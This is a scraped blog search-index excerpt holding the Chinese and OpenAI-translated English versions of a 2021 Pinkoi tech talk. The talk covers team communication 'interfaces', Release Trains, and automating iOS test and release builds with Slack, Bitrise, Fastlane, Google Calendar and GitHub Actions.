來達成，輸入完成後會觸發 Bitrise 跑 Fastlane 腳本去打包上傳測試版 ipa 到 Firebase App Distribution。 Slack Workflow 應用可參考此篇文章： Slack 打造全自動 WFH 員工健康狀況回報系統Firebase App Distribution要測試的隊友，只要照著 Firebase App Distribution 的步驟安裝完憑證、註冊完裝置，就能在上面選擇安裝想要的測試版，或直接回去點信的連結安裝。 但這邊要注意，iOS Firebase App Distribution 佔用的是 Development Device，上限只能只能註冊 100 個裝置，看裝置不看人。 所以可能要跟 TestFlight (by 人，外部測試 1,000 人) 的解法做個權衡。但至少前面的 Slack WorkFlow UI Input 是可以考慮採用的。 如果要做的進階可以開發 Slack Bot，能有更完整更客製化的流程、表單可用。Recap 釋出測試版自動化的成效，最有感的是把整個步驟都搬到雲端上執行，App Team 不需要插手，完全自助式。打包正式版的問題第二個也是 App Team 很常要做的事，打包、送審正式版 App。團隊小的時候，只有單線開發，App 版本更新問題不大，可以很自由也可以很規律。但團隊大，同時有多線的需求在開發跟迭代，就會遇到如上圖的狀況，沒有做好前文說的「介面溝通」就會大家各自上各自的，這會導致 App Team 疲於奔命，因 App 更新的成本比網頁高、過程繁瑣，另一方面頻繁零亂的更新也很干擾使用者。最後是管理問題，如果沒有固定的流程、日期，很難去對每個步驟該做什麼事進行優化。問題如上。解決辦法是導入 Release Train 到開發流程中，核心概念是把版本更新跟專案開發這兩件事分開。我們將日程固定下來，每個階段會做什麼事也定下來： 固定週一早上更新新版 固定週三 Code Freeze (不再 Merge Feature PR) 固定週四開始 QA 固定週五打包正式實際時程(QA 多久)、發版週期(每週、每兩週、每個月)依照各公司狀況可自行調整， 核心就是確定什麼固定什麼時間點做什麼事 。這是國外推友發的版更週期調查，大多是 2 週一次。以每週更新 &amp; 我們多團隊為例，就會如上圖。Release Train 顧名思義就像火車站一樣，每個版本都是一班列車如果錯過就要等下一班， 各個 Squad 團隊跟專案自己選擇要上車的時間這是一個很好的溝通介面，大家只要有共識並遵守規定就能有條不紊的更新版本。更多 Release Train 的技術細節可參考： Mobile release trains — Travelperk Agile Release Train Release Quality and Mobile Trains流程、日程確定後，我們就可以對每個階段做的事進行優化。像是打包正式版，傳統手動方式費時費力，從打包、上傳、送審整個流程大概要花 1 個小時，這時間內工作狀態要一直切換，很難做其他事；每次的打包都會重複這個過程，很浪費工作效率。既然我們已經固定日程了，這邊直接引入 Google Calendar，將預計日程要做的事加到行事曆上，時間到的時候會透過 Google Apps Script 去呼叫 Bitrise 執行 Fastlane 打包正式版和送審的腳本完成全部工作。使用 Google Calendar 串接還有個好處，如果遇到突發狀況需要延後、提早，直接上去更改日期即可。 Google Apps Script 若要直接在 Google Calendar 事件時間到時自動執行，目前只能自己 on 服務來做，如果要快速解決可以使用 IFTTT 做為 Google Calendar &lt;-&gt; Bitrise/Google Apps Script 的橋樑，做法可 參考此篇文章 。p.s. 1. 目前 Pinkoi iOS Team 是採用 Gitflow 工作流程。2. 原則上這個共識是所有團隊都要遵守，所以不希望有需求是打破這個規則的 (EX: 特別週三要上)，但如果是與外部合作的項目，如果真的沒辦法還是要保持彈性，畢竟這個共識是團隊內的。3. HotFix 嚴重問題，是隨時可更新的，不受 Release Train 規範。這邊多提了 Google App Scripts 的應用，詳情可參考： 運用 Google Apps Script 轉發 Gmail 信件到 Slack 。最後一個是使用 Github Action 提升協作效率 (PR Review)。Github Action 是 Github 的 CI/CD 服務，可以直接與 Github 事件作綁定，觸發時機從 open issue、open pr 到 merge pr…等等都有。Github Action 只要是 Github 託管的 Git 專案都能使用，Public Repo 沒有限制，Private 每個月有 2,000 分鐘的免費額度可以用。這邊舉兩個功能： (左)是 PR Review 完之後會自動打上 reviewer name Label，讓我們能快速 summary pr review 的狀況。 (右)是每天會在固定時間整理＆發送訊息到 Slack Channel，提醒隊友有哪些 PR 正在等待 Review（ 仿造 Pull Reminders 的功能 ）。Github Action 還有很多可以做的自動化項目，大家可以發揮想像。像是在開源專案常看到的 issue bot：fastlane / fastlane或自動關閉太久沒 Merge 的 pr 都能用 Github Action 來自動完成。Recap 自動化打包正式版的成效，一樣直接使用現有工具串接；除了 自動化之外還加入固定流程達到加倍提升工作效率原本除了手動打包時間，其實還有額外溝通上版時間的成本，現在直接歸 0；只要確保在時程內 上車 就可以把時間都專注在「討論」跟「開發」上。總計算一下這兩個自動化帶來的成效，一年可節省 216 工作時數。自動化加上前面提到的溝通介面，我們來看一下做這些事總共能提升多少效率。除了剛做的項目，我們還需要多評估 心流切換成本 ，當我們持續投入工作一段時間後就會進入「心流」狀態，此時的思緒、生產力都達到巔峰，能提供做好最有效的產出；但如果被無謂的事(EX: 多餘的溝通、重複性工作)打斷，要重新回到心流，又會再需要一段時間，這邊以 30 分鐘為例。被無謂的事打斷的心流切換成本也應該列入計算，這邊抓 30 分鐘每次，一個月發生 10 次，60 人一年就多浪費 3,600 小時。心流切換成本 (3,600) + 溝通介面不好的情況下多餘的溝通 (1,200) + 自動化解決的重複性工作 (216) = 一年多損失了 5,016 小時。原本浪費的工作時間，節省起來後可以投入其他更有價值的事，所以實際換成產能應該還要再 X 200%。 尤其隨著團隊規模不斷成長，對工作效率的影響也隨之放大。 早優化早享受，晚優化沒折扣！！Recap 高效率工作團隊的內幕，我們主要做了什麼事。 No Code/Low Code First 優先選擇現有工具串接（如本篇範例）如果沒有現有工具可用再來評估投入自動化的成本，跟實際節省的收入。關於文化的支持在 Pinkoi 人人都可以是解決問題的領導者對於問題的解決，事情的改變；絕大多數都需要很多很多團隊一起努力才有可能更好，這部分就很需要公司文化的支持鼓勵，不然只有自已在推動會非常辛苦。 在 Pinkoi 人人都可以是解決問題的領導者，不一定要是 Lead or PM 才能解決問題，前面介紹的溝通介面、工具或自動化項目很多都是隊友發現問題，提出解法，大家一起努力完成的。關於團隊文化是如何支持推動改變的，解決問題的四個階段都可以連結到 Pinkoi 的 Core Values。第一步 Grow Beyond Yesterday 好還要更好，如果有發現問題，不管是大小，前面有說到隨團隊規模成長，小問題也會有放大效果 調查、歸納問題，避免過早優化(有的問題可能只是暫時過渡而已)再來是 Build Partnerships 積極的溝通各面向蒐集建議 保持換位思考(因為有的問題可能是對方的最佳解，要做好權衡)第三步 Impact Beyond Your Role 發揮自身影響力 提出問題解決計畫 如果跟重複工作有關則優先使用自動化方案 記得保持彈性跟可擴充性，避免 Over Engineering最後 Dare to Fail！ 勇敢實踐 持續追蹤、動態調整解決方案 取得成功後，記得與團隊分享成果，以促成跨部門資源整合 (因為同個問題可能同時存在在多個部門)以上是 Pinkoi 高效率工程團隊大解密的分享，謝謝大家。立即加入 Pinkoi &gt;&gt;&gt; https://www.pinkoi.com/about/careers有任何問題及指教歡迎 與我聯絡 。本文首次發表於 Medium ➡️ 前往查看由 ZMediumToMarkdown 與 Medium-to-jekyll-starter 提供自動轉換與同步技術。Improve this page on Github.Follow Me on Medium 1K+ Followers 2,818 Total Views Last Statistics Date: 2025-08-15 | 2,689 Views on Medium." }, { "title": "2021 Pinkoi Tech Career Talk — Secrets of an Efficient Engineering Team", "url": "/posts/pinkoi-engineering/en/2021-pinkoi-tech-career-talk-secrets-of-an-efficient-engineering-team-11f6c8568154/", "categories": "Pinkoi Engineering", "tags": "pinkoi, automation, ios-app-development, engineering-management, workflow", "date": "2021-09-09 20:13:53 +0800", "snippet": "ℹ️ℹ️ℹ️ The following content is translated by OpenAI.Click here to view the original Chinese version. | 點此查看本文中文版2021 Pinkoi Tech Career Talk — Secrets of an Efficient Engineering TeamTech Talk sha...", "content": "ℹ️ℹ️ℹ️ The following content is translated by OpenAI.Click here to view the original Chinese version. | 點此查看本文中文版2021 Pinkoi Tech Career Talk — Secrets of an Efficient Engineering TeamTech Talk sharing on the secrets of Pinkoi’s efficient engineering teamSecrets of an Efficient Engineering Team2021/09/08 19:00 @ Pinkoi x YouratorMy Medium: ZhgChgLiAbout the TeamPinkoi’s work structure consists of multiple Squads: Buyer-Squad: Focused on buyer-side features Seller-Squad: Focused on designer-side features Exploring-Squad: Focused on browsing and exploration Ad-Squad: Focused on platform advertising Out-Of-Squad: Primarily for support, infrastructure, or process optimizationEach Squad is composed of team members from various functions, including PM, Product Designer, Data, Frontend, Backend, iOS, Android, etc.; long-term and ongoing work objectives are completed by the Squad.In addition to Squads, there are also cross-team projects that typically have medium to short-term work objectives. These can be led by any team member, regardless of their role, who acts as the Project Owner, and the project is closed upon completion. At the end of the article, there is a section on how Pinkoi’s culture supports teammates in problem-solving. If you are not interested in the actual content, feel free to skip to the bottom of the page to view this section.The Relationship Between Team Size and EfficiencyThe growth of team size and its relationship with work efficiency is evident; having experienced teams ranging from 10 to 100 people (though I haven’t yet faced a team of 1,000), the difference between 10 and 100 is significant in many aspects.With fewer people, communication and task handling are quick; discussions can happen in person, and solutions can be provided immediately. The “connections between people” are strong, allowing for synchronized collaboration.However, with more people, direct communication becomes challenging. As the number of collaborators increases, discussions can take up an entire morning, and with many people involved, tasks must be prioritized. Non-urgent matters cannot be addressed immediately, leading to asynchronous waiting while other tasks are tackled.Adding more roles allows for more specialized work division, providing greater capacity or better quality and faster output.But as mentioned earlier, this also means more collaboration, which in turn requires more communication time.Small issues can be magnified; for instance, if one person spends 10 minutes daily updating reports, that’s manageable. But if this scales to 20 people, it could take over 3 hours daily to update reports. At this point, optimizing and automating the reporting process becomes invaluable, saving 3 hours a day, which translates to 750 hours wasted over 250 working days in a year.As team size grows, the App Team, for example, has closer collaboration with the following roles.Backend — API, Product Designer — UI; this is self-explanatory. Since Pinkoi is an international product, the Localization Team helps us translate functional text. Additionally, we have a Data Team that conducts data collection and analysis, so besides developing features, we also need to discuss event tracking points with the Data Team.Customer Service frequently interacts with us as well. Users sometimes directly leave feedback on orders through the marketplace, and more often, they leave a one-star rating indicating an issue. In such cases, we need to ask the Customer Service team to conduct a deeper inquiry: What problem did you encounter? How can we assist you?With so many collaborative relationships, this means numerous communication opportunities. But remember, we are not trying to avoid or minimize communication; excellent engineers also need strong communication skills.What we need to focus on is important communication, such as brainstorming, discussing requirements, and timelines; we should avoid wasting time on repetitive confirmations of issues or vague discussions. We should also prevent situations where you ask me, and I ask you about someone else’s situation.Especially in the era of the pandemic, communication time is precious and should be dedicated to more valuable discussions.“I thought you thought I thought” — this phrase perfectly illustrates the consequences of vague communication.Not only in work but also in daily life, we often encounter misunderstandings due to differing perceptions. In daily life, we rely on mutual understanding; however, in work, if there are different perceptions without in-depth discussions, it is easy to discover discrepancies during the output phase.Interface CommunicationThe idea introduced here is to communicate through a consensus interface, similar to the Dependency Inversion Principle in object-oriented programming under the SOLID principles (no need to understand this). The same concept can be applied to communication.The first step is to identify areas that are vague, require repeated confirmations, or need specific communication to be more focused and effective. There may even be tasks that only require this delivery without additional communication.Once the issues are identified, we can define the “interface.” An interface serves as a medium and can be a document, process, checklist, or tool, etc.Using this “interface” as a bridge for communication, there can be multiple interfaces; use the appropriate interface for each scenario. When encountering the same scenario, prioritize using this interface for initial communication. If further discussion is needed, it can be based on this interface for focused problem-solving.App Team and External Collaboration RelationshipsHere are four examples of interface communication within the App Team’s collaboration:The first is collaboration with Backend. Without any consensus on the interface, the situation may resemble the image above.Regarding how to use the API, simply providing the API Response String to the App Team can lead to ambiguities. For example, how do we know if date refers to the Register Date or Birthday? There are many fields that need clarification.This communication is also repetitive; every time a new Endpoint is introduced, it requires confirmation again.This is a classic case of ineffective communication.What the App and Backend lack is a communication interface. There are many solutions, and it doesn’t necessarily have to be a tool; it could simply be a manually maintained document.This was shared during the 2020 Pinkoi Developer Night — by TokiPinkoi uses Python (FastAPI) to automatically generate documentation from API Code. PHP can use Swagger (previously used by the company); the advantage is that the overall framework and data formats can be automatically generated from the code, reducing maintenance costs, and only the field descriptions need to be handled.p.s. Currently, new Python 3 projects use FastAPI, while older ones will be gradually updated, and for now, PostMan is used as the communication interface.The second example is collaboration with Product Designers, which is similar to Backend but focuses on confirming UI Specs and Flow.If color codes and fonts are scattered, our App will suffer greatly. Setting aside the requirements, we want to avoid situations where the same Title has the same color but different codes or where UI elements in the same position are inconsistent.The most basic solution is to ask the designers to organize the UI component library and establish a Design System (Guideline), ensuring proper labeling when presenting UI.In our Code Base, we establish corresponding Fonts and Colors based on the Design System (Guideline) and create Buttons and Views according to the component library.When templating, we uniformly use these established components, allowing us to quickly align with the UI design drafts. However, this can easily become chaotic and needs to be dynamically adjusted; it cannot cover too many special cases, nor can it be rigid and unexpandable.p.s. At Pinkoi, collaboration with Product Designers is mutual; Developers can also propose better practices for discussion with Product Designers.The third example is the interface with Customer Service. Marketplace reviews are crucial for products, but they involve a lot of manual and repetitive communication.We need to manually check new reviews from time to time, and if there are customer service issues, we forward them to Customer Service for assistance, which is quite repetitive and labor-intensive.The best solution is to enable marketplace reviews to automatically sync to our work platform. We can either purchase existing services or use my developed ZhgChgLi / ZReviewTender (new in 2022). For deployment methods, tutorials, and technical details, please refer to: ZReviewTender — Free Open Source App Reviews Monitoring BotThis bot serves as our communication interface, automatically forwarding reviews to a Slack Channel, allowing everyone to quickly receive the latest review information and track discussions.The final example is our dependency on the Localization Team. Whether it’s new features or modifying old translations, we need to wait for the Localization Team to complete their work before we can assist with the next steps.Developing our own tools for this is too costly, so we directly use third-party services to help us eliminate dependency.All translations and keys are managed by third-party tools. As long as we define the keys in advance, we can act independently; both parties only need to complete their work before the deadline for packaging, without relying on each other. Once the Localization Team completes the translations, the tool automatically triggers a git pull to update the latest text files in the project.p.s. Pinkoi has had this process in place for a long time; initially, we used Onesky, but in recent years, more excellent tools have become available, which can be considered for adoption.Internal Collaboration Relationships within the App TeamHaving discussed external collaboration, let’s now focus on internal collaboration.When there are few people or when a single developer maintains a project, you can do whatever you want; your grasp and understanding of the project are high, so there are usually no issues. Of course, if you have a good sense, you can achieve everything mentioned here even in a one-person project.However, as the number of collaborators increases, and everyone works under the same project, if each person continues to work independently, it will lead to disaster.For example, if one person implements an API in one way and another does it differently, it often results in reinventing the wheel, wasting time, or carelessly pushing things live without consideration, which significantly increases future maintenance and scalability costs.Within the team, rather than calling it an interface, I think it’s more about consensus and resonance, fostering a stronger team spirit.The most basic and often-discussed aspect is Coding Style, including naming conventions, placement, how to use Delegates, etc. We can use commonly accepted tools like realm / SwiftLint for constraints, and multi-language statements can be organized using freshOS / Localize (of course, if you are already using the previously mentioned third-party tool management, you can skip this).The second aspect is the App architecture; whether it’s MVC/MVVM/VIPER/Clean Architecture, the core focus should be cleanliness and consistency; there’s no need to chase trends, just ensure uniformity. The Pinkoi App Team uses Clean Architecture. Previously at StreetVoice, we used pure MVC, but it was clean and consistent, making collaboration smooth.Additionally, Unit Testing is crucial; with more people, it’s hard to avoid having the logic you’re working on inadvertently broken one day. Writing more tests provides an extra layer of assurance.Lastly, documentation is essential, covering the team’s processes, specifications, or operation manuals, making it easy for teammates to quickly reference when they forget and for newcomers to get up to speed.Beyond code-level interfaces, there are other interfaces that assist us in improving efficiency in collaboration.The first is a Request for Comments phase before implementing requirements, where the developer explains how the requirement will be addressed, and others can provide feedback and thoughts.---title: Enhancing Work Efficiency through Automation and Communication---In addition to preventing the reinvention of the wheel, we can also gather collective insights. For instance, how others might expand on existing work, or what future needs could be considered... and so on. Those involved may be confused, while observers have clarity.The second point is to conduct thorough Code Reviews to ensure our interface consensus is being implemented correctly. This includes aspects like naming conventions, UI layout methods, delegate usage, and protocol/class declarations, among others. We also need to check if the architecture is being misused or hastily written, and if the development direction is indeed moving towards a fully Swift environment, rather than still sending Objective-C code... and so forth.The primary focus should be on reviewing these aspects, with functionality being a secondary concern.p.s. The purpose of an RFC is to enhance work efficiency, so it should not be overly lengthy, as that could severely hinder progress. Think of it as a simple discussion phase before starting work.![](/assets/11f6c8568154/1*nn--T1ToO7FxRUHAv_3vig.webp){: lqip=\"data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI5NjAiIGhlaWdodD0iNTQwIj48cmVjdCB3aWR0aD0iMTAwJSIgaGVpZ2h0PSIxMDAlIiBmaWxsPSJncmV5Ii8+PC9zdmc+\" }To summarize the consensus on interfaces within the team, I want to mention a mindset called the **Crash Theory**, which I believe serves as a good behavioral benchmark.![Excerpt from [MBA Knowledge Base](https://wiki.mbalib.com/zh-tw/%E5%9D%A0%E6%9C%BA%E7%90%86%E8%AE%BA){:target=\"_blank\"}](/assets/11f6c8568154/1*QJ8P_HjSvPdYrUmrqsQZXA.webp){: lqip=\"data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIxMjAwIiBoZWlnaHQ9IjI4MiI+PHJlY3Qgd2lkdGg9IjEwMCUiIGhlaWdodD0iMTAwJSIgZmlsbD0iZ3JleSIvPjwvc3ZnPg==\" }Excerpt from [MBA Knowledge Base](https://wiki.mbalib.com/zh-tw/%E5%9D%A0%E6%9C%BA%E7%90%86%E8%AE%BA){:target=\"_blank\"}Applying this to the team, we should consider whether, if everyone suddenly disappeared, the existing code, processes, and systems would allow new members to quickly get up to speed.![](/assets/11f6c8568154/1*Q44KLIwDjvAPuNDDf6KB3g.webp){: lqip=\"data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI5NjAiIGhlaWdodD0iNTQwIj48cmVjdCB3aWR0aD0iMTAwJSIgaGVpZ2h0PSIxMDAlIiBmaWxsPSJncmV5Ii8+PC9zdmc+\" }Recapping the significance of interfaces, the interfaces within the team are meant to enhance mutual understanding, while collaboration outside the team aims to reduce ineffective communication. Using interfaces as communication tools should focus on discussing needs without interruption.![](/assets/11f6c8568154/1*WXYAk1_4fA0kll-HyMXL5w.webp){: lqip=\"data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI5NjAiIGhlaWdodD0iNTQwIj48cmVjdCB3aWR0aD0iMTAwJSIgaGVpZ2h0PSIxMDAlIiBmaWxsPSJncmV5Ii8+PC9zdmc+\" }To reiterate, \"interface communication\" is not some special proprietary term or tool; it is simply a concept applicable to any collaborative work scenario. It can be as simple as a document or a process, and it should come first before any communication takes place.![](/assets/11f6c8568154/1*oN-qJ4lNMtijsCoSIqrr_g.webp){: lqip=\"data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI5NjAiIGhlaWdodD0iNTQwIj48cmVjdCB3aWR0aD0iMTAwJSIgaGVpZ2h0PSIxMDAlIiBmaWxsPSJncmV5Ii8+PC9zdmc+\" }Here, let's assume that each time we spend an extra 10 minutes communicating, with a team of 60 people, and this happens 10 times a month, we waste 1,200 hours a year on unnecessary communication.### Improving Efficiency — Automating Repetitive Tasks![](/assets/11f6c8568154/1*vMq1UmYeW611XYf0yHv8AQ.webp){: lqip=\"data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI5NjAiIGhlaWdodD0iNTQwIj48cmVjdCB3aWR0aD0iMTAwJSIgaGVpZ2h0PSIxMDAlIiBmaWxsPSJncmV5Ii8+PC9zdmc+\" }In this chapter, I want to share insights on how automating repetitive tasks can enhance work efficiency, using iOS as an example, though the same principles apply to Android.I won't delve into technical implementation details, but rather discuss the feasibility of the principles.![](/assets/11f6c8568154/1*i_0yUCYq6jl-7uf5mynxLA.webp){: lqip=\"data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI5NjAiIGhlaWdodD0iNTQwIj48cmVjdCB3aWR0aD0iMTAwJSIgaGVpZ2h0PSIxMDAlIiBmaWxsPSJncmV5Ii8+PC9zdmc+\" }Let's summarize the services we use, including but not limited to:- Slack: Communication software- Fastlane: iOS automation script tool- Github: Git provider- Github Action: CI/CD service from Github, which will be introduced later- Firebase: Crashlytics, Event, App Distribution (to be introduced later), Remote Config...- Google Apps Script: Plugin script for Google Apps, to be introduced later- Bitrise: CI/CD server- Onesky: Third-party localization tool mentioned earlier- Testflight: iOS app internal testing platform- Google Calendar: Google Calendar, which will be explained later- Asana: Project management tool#### Issues with Releasing Test Versions![](/assets/11f6c8568154/1*kaNm3auxnqlJ4ObE84sitA.webp){: lqip=\"data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI5NjAiIGhlaWdodD0iNTQwIj48cmVjdCB3aWR0aD0iMTAwJSIgaGVpZ2h0PSIxMDAlIiBmaWxsPSJncmV5Ii8+PC9zdmc+\" }The first repetitive issue arises when we want to allow teammates to test the app during the development phase. Traditionally, this involves directly borrowing a phone to build the app. If there are only 1-2 people, it's manageable, but with a team of 20-30 people needing to test, the entire day spent helping install the test version means no work gets done. Moreover, if there are updates, everything has to be redone.![](/assets/11f6c8568154/1*r_jYD3jukkUPKOdtnK8zyA.webp){: lqip=\"data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI5NjAiIGhlaWdodD0iNTQwIj48cmVjdCB3aWR0aD0iMTAwJSIgaGVpZ2h0PSIxMDAlIiBmaWxsPSJncmV5Ii8+PC9zdmc+\" }Another method is to use TestFlight as a medium for releasing test versions, which I think is also good. However, there are two issues: first, TestFlight is equivalent to a production environment, not a debug one; second, when many teammates are testing different requirements simultaneously, TestFlight can become chaotic, and the builds can change frequently, though it's still feasible.![](/assets/11f6c8568154/1*XLB0THtHAM65_e4FdtEXKg.webp){: lqip=\"data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI5NjAiIGhlaWdodD0iNTQwIj48cmVjdCB3aWR0aD0iMTAwJSIgaGVpZ2h0PSIxMDAlIiBmaWxsPSJncmV5Ii8+PC9zdmc+\" }At Pinkoi, our solution is to separate the task of \"installing the test version by the App Team\" and use Slack Workflow as the input UI. Once the input is complete, it triggers Bitrise to run the Fastlane script to package and upload the test version IPA to Firebase App Distribution.&gt; _For reference on Slack Workflow applications, see this article: [Creating a Fully Automated WFH Employee Health Reporting System with Slack](/posts/zrealm-dev/en/slack-creates-an-automated-wfh-employee-health-reporting-system-d61062833c1a/)_![](/assets/11f6c8568154/1*2mNIlReKlROzcgviY9_JTg.webp){: lqip=\"data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI3MjQiIGhlaWdodD0iMTU0OCI+PHJlY3Qgd2lkdGg9IjEwMCUiIGhlaWdodD0iMTAwJSIgZmlsbD0iZ3JleSIvPjwvc3ZnPg==\" }![Firebase App Distribution](/assets/11f6c8568154/1*dwwOvnVwuF1sCUnyppBCDQ.webp){: lqip=\"data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI1NDEiIGhlaWdodD0iMTIwMCI+PHJlY3Qgd2lkdGg9IjEwMCUiIGhlaWdodD0iMTAwJSIgZmlsbD0iZ3JleSIvPjwvc3ZnPg==\" }Teammates who need to test can simply follow the steps on Firebase App Distribution to install the certificates and register their devices, allowing them to choose which test version to install or directly click the link in the email to install.&gt; _However, note that iOS Firebase App Distribution uses Development Devices, with a limit of only 100 devices that can be registered, based on devices rather than individuals._&gt; _So, there may need to be a trade-off with TestFlight (which allows external testing for 1,000 people)._At least the initial Slack Workflow UI input is something to consider adopting.&gt; _For advanced implementations, a Slack Bot could be developed for a more complete and customized process and forms._![](/assets/11f6c8568154/1*-2oet_gRdews7-wccdrmiA.webp){: lqip=\"data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI5NjAiIGhlaWdodD0iNTQwIj48cmVjdCB3aWR0aD0iMTAwJSIgaGVpZ2h0PSIxMDAlIiBmaWxsPSJncmV5Ii8+PC9zdmc+\" }Recapping the effectiveness of automating the release of test versions, the most significant benefit is moving the entire process to the cloud, allowing the App Team to remain uninvolved and enabling a fully self-service experience.#### Issues with Packaging Official VersionsThe second common task for the App Team is packaging and submitting the official version of the app.![](/assets/11f6c8568154/1*Fd245lp2QSQV7d3AIdf94w.webp){: lqip=\"data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI5NjAiIGhlaWdodD0iNTQwIj48cmVjdCB3aWR0aD0iMTAwJSIgaGVpZ2h0PSIxMDAlIiBmaWxsPSJncmV5Ii8+PC9zdmc+\" }When the team is small, with only single-threaded development, updating app versions is not a major issue, allowing for both freedom and regularity.However, with a larger team, where multiple threads of requirements are being developed and iterated, the situation can become chaotic as shown in the image above. Without proper \"interface communication\" as mentioned earlier, everyone may work independently, leading to the App Team being overwhelmed. The cost of app updates is higher than that of web updates, and the process is more complicated. Additionally, frequent and chaotic updates can disrupt users.Finally, there is a management issue; without a fixed process and schedule, it becomes challenging to optimize each step.![](/assets/11f6c8568154/1*eRm97daYTwlEBFGtWoZgdQ.webp){: lqip=\"data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI5NjAiIGhlaWdodD0iNTQwIj48cmVjdCB3aWR0aD0iMTAwJSIgaGVpZ2h0PSIxMDAlIiBmaWxsPSJncmV5Ii8+PC9zdmc+\" }The issues are as shown above.![](/assets/11f6c8568154/1*3b_wX91dtYF0ogHjKsaR6g.webp){: lqip=\"data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI5NjAiIGhlaWdodD0iNTQwIj48cmVjdCB3aWR0aD0iMTAwJSIgaGVpZ2h0PSIxMDAlIiBmaWxsPSJncmV5Ii8+PC9zdmc+\" }The solution is to introduce a Release Train into the development process. The core concept is to separate version updates from project development.We will fix the schedule and define what will be done at each stage:- Fixed updates on Monday mornings- Fixed code freeze on Wednesdays (no more merging feature PRs)- Fixed QA starts on Thursdays- Fixed packaging for official release on FridaysThe actual schedule (how long QA takes) and release cycle (weekly, bi-weekly, monthly) can be adjusted according to each company's situation. **The core is to determine what fixed tasks will be done at what time.**This is a survey of version update cycles shared by international peers, with most being every two weeks.![](/assets/11f6c8568154/1*uOXXmdDoocyFImsq-z7tVQ.webp){: lqip=\"data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI5NjAiIGhlaWdodD0iNTQwIj48cmVjdCB3aWR0aD0iMTAwJSIgaGVpZ2h0PSIxMDAlIiBmaWxsPSJncmV5Ii8+PC9zdmc+\" }Using a weekly update and our multi-team example, it would look like the image above.As the name suggests, the Release Train operates like a train station, with each version being a train.**If you miss it, you have to wait for the next one.** Each squad and project can choose when to board.This serves as a great communication interface; as long as everyone is on the same page and follows the rules, updates can proceed in an orderly manner.**For more technical details on Release Train, refer to:**- [Mobile release trains — Travelperk](https://speakerdeck.com/lgvalle/mobile-release-trains){:target=\"_blank\"}- [Agile Release Train](https://www.scaledagileframework.com/agile-release-train/){:target=\"_blank\"}- [Release Quality and Mobile Trains](https://developers.soundcloud.com/blog/quality-mobile-trains){:target=\"_blank\"}![](/assets/11f6c8568154/1*DZwSmwnVCGkO--1PEzgqgw.webp){: lqip=\"data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI5NjAiIGhlaWdodD0iNTQwIj48cmVjdCB3aWR0aD0iMTAwJSIgaGVpZ2h0PSIxMDAlIiBmaWxsPSJncmV5Ii8+PC9zdmc+\" }Once the processes and schedules are confirmed, we can optimize what needs to be done at each stage.For instance, packaging the official version traditionally takes a lot of time and effort. The entire process from packaging, uploading, to submission can take about an hour, during which one has to constantly switch work states, making it difficult to focus on other tasks. Each packaging involves repeating this process, which wastes work efficiency.![](/assets/11f6c8568154/1*RPSgRUXh3ITDJykQ6N-DTw.webp){: lqip=\"data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI5NjAiIGhlaWdodD0iNTQwIj48cmVjdCB3aWR0aD0iMTAwJSIgaGVpZ2h0PSIxMDAlIiBmaWxsPSJncmV5Ii8+PC9zdmc+\" }Since we have already fixed the schedule, we can directly integrate Google Calendar, adding the tasks to be done on the planned dates. When the time comes, Google Apps Script will call Bitrise to execute the Fastlane script for packaging the official version and submitting it, completing all tasks.Using Google Calendar integration also has the advantage that if unexpected situations arise requiring delays or advancements, the dates can be easily changed.&gt; _Currently, to automatically execute Google Apps Script at the time of a Google Calendar event, one must set up the service themselves. For a quick solution, IFTTT can be used as a bridge between Google Calendar and Bitrise/Google Apps Script. For more details, see [this article](https://gist.github.com/tanaikech/fbbfaa8f2a8a770424974aa16b9b6f3b){:target=\"_blank\"}._p.s.1. The Pinkoi iOS Team currently uses the Gitflow workflow.2. In principle, this consensus should be followed by all teams, so we do not want any requirements that break this rule (e.g., needing to go live on a special Wednesday). However, for projects involving external collaboration, flexibility must be maintained if absolutely necessary, as this consensus is internal to the team.3. Hotfixes for serious issues can be updated at any time, regardless of the Release Train regulations.![](/assets/11f6c8568154/1*tBGh-uxgoCTXfQ-u4GZq8g.webp){: 